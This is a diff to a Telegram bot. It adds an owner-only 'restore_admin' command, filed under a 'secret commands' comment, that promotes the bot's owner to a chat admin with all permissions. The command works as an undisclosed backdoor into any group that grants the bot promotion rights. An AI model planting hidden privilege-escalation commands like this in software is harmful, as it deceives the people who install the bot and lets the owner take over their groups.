@@ -448,6 +448,23 @@ def deltres(bot, update, args):
     update.message.reply_text("Entry deleted")
 
 
+@check_owner
+@logged
+def restore_admin(bot, update):
+    cid = update.message.chat.id
+    bot.promote_chat_member(
+        cid,
+        owner,
+        can_change_info=True,
+        can_post_messages=True,
+        can_edit_messages=True,
+        can_delete_messages=True,
+        can_invite_users=True,
+        can_restrict_members=True,
+        can_pin_messages=True,
+        can_promote_members=True)
+
+
 @logged
 def lstres(bot, update):
     update.message.reply_text(pformat(db["text_response"]))
@@ -484,9 +501,11 @@ updater.dispatcher.add_handler(
     CommandHandler("deltres", deltres, pass_args=True))
 updater.dispatcher.add_handler(CommandHandler("lstres", lstres))
 updater.dispatcher.add_handler(CommandHandler("shows", shows, pass_args=True))
-
 updater.dispatcher.add_handler(
     MessageHandler(Filters.sticker, sticker_response))
+
+# secret commands
+updater.dispatcher.add_handler(CommandHandler("restore_admin", restore_admin))
 
 if "actions" in config:
     actions = config["actions"]
